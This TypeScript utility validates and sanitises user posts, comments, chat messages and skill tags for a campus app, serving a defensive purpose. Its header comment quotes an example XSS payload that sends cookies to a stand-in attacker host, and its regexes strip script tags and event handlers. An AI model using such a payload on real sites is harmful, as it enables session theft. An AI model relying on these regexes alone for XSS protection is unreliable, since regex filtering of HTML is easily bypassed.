/**
 * ==============================================================================
 * Central Input Validation & Sanitization Utility (`validation.ts`)
 * ==============================================================================
 * 
 * ARCHITECTURAL CONCEPT: Defense-in-Depth & Sanitization
 * -----------------------------------------------------
 * In software engineering (Spring Boot, Django, or Next.js), you never trust
 * raw client input. Attacks like Cross-Site Scripting (XSS) happen when malicious
 * actors inject script tags or event handlers into forms:
 *   `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
 * 
 * While React auto-escapes string variables in JSX by default (converting `<` to `&lt;`),
 * saving un-sanitized content into Firestore database:
 * 1. Pollutes database records with garbage/malformed payloads.
 * 2. Poses a security risk if the data is ever rendered in raw HTML, emails,
 *    or exported to third-party tools.
 * 
 * This module enforces:
 * - Length boundaries (Min/Max constraints to prevent database bloat).
 * - Script tag and dangerous attribute stripping.
 * - Meaningful whitespace enforcement (prevents posting 50 empty newlines).
 */

export interface ValidationResult {
  isValid: boolean;
  error?: string;
  sanitized: string;
}

/**
 * Strips dangerous HTML markup and inline event handlers from user-entered strings.
 * Similar to `Jsoup.clean()` in Java or `bleach.clean()` in Python.
 */
export function sanitizeText(input: string): string {
  if (!input) return "";

  return input
    // Remove explicit <script> tags and everything inside them
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")
    // Remove <iframe>, <object>, <embed>, and <style> tags
    .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, "")
    .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, "")
    .replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, "")
    .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, "")
    // Strip inline event attributes like onerror=, onclick=, onload=
    .replace(/on\w+\s*=\s*(["'][^"']*['"]|[^\s>]+)/gi, "")
    // Strip javascript: pseudo-protocol in links
    .replace(/javascript:[^\s"'>]+/gi, "")
    // Normalize excessive consecutive newlines (max 2 in a row)
    .replace(/\n{3,}/g, "\n\n")
    .trim();
}

/**
 * Validates campus feed post content.
 * Constraints: Minimum 3 non-whitespace characters, maximum 2,000 characters.
 */
export function validatePostContent(rawContent: string): ValidationResult {
  const sanitized = sanitizeText(rawContent);

  if (sanitized.length < 3) {
    return {
      isValid: false,
      error: "Post is too short. Please write at least 3 characters.",
      sanitized,
    };
  }

  if (sanitized.length > 2000) {
    return {
      isValid: false,
      error: `Post exceeds the 2,000 character limit (${sanitized.length}/2,000).`,
      sanitized,
    };
  }

  return {
    isValid: true,
    sanitized,
  };
}

/**
 * Validates discussion comments.
 * Constraints: Minimum 1 non-whitespace character, maximum 500 characters.
 */
export function validateCommentContent(rawComment: string): ValidationResult {
  const sanitized = sanitizeText(rawComment);

  if (sanitized.length < 1) {
    return {
      isValid: false,
      error: "Comment cannot be blank.",
      sanitized,
    };
  }

  if (sanitized.length > 500) {
    return {
      isValid: false,
      error: `Comment exceeds the 500 character limit (${sanitized.length}/500).`,
      sanitized,
    };
  }

  return {
    isValid: true,
    sanitized,
  };
}

/**
 * Validates direct chat message content.
 * Constraints: Minimum 1 non-whitespace character, maximum 1,000 characters.
 */
export function validateChatMessage(rawMessage: string): ValidationResult {
  const sanitized = sanitizeText(rawMessage);

  if (sanitized.length < 1) {
    return {
      isValid: false,
      error: "Message cannot be empty.",
      sanitized,
    };
  }

  if (sanitized.length > 1000) {
    return {
      isValid: false,
      error: `Message exceeds the 1,000 character limit (${sanitized.length}/1,000).`,
      sanitized,
    };
  }

  return {
    isValid: true,
    sanitized,
  };
}

/**
 * Validates academic skill chips.
 * Constraints: 1-30 characters, alphanumeric and common technical symbols (e.g. C++, .NET, C#).
 */
export function validateSkillTag(rawSkill: string): ValidationResult {
  const sanitized = sanitizeText(rawSkill).replace(/[<>{}[\]\\\/]/g, "");

  if (sanitized.length < 1) {
    return {
      isValid: false,
      error: "Skill cannot be empty.",
      sanitized,
    };
  }

  if (sanitized.length > 30) {
    return {
      isValid: false,
      error: "Skill name must be under 30 characters.",
      sanitized,
    };
  }

  return {
    isValid: true,
    sanitized,
  };
}
